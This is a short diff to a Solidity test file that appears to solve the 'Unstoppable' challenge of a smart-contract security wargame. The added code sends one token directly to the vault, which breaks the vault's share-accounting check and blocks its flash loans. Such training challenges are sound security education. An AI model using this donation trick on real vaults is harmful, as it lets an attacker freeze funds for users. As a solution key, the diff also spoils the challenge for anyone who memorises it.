@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // sending some tokens to the vault makes the condition convertToShares(totalSupply) != balanceBefore to revert
+        token.transfer(address(vault), 1);
     }
 
     /**
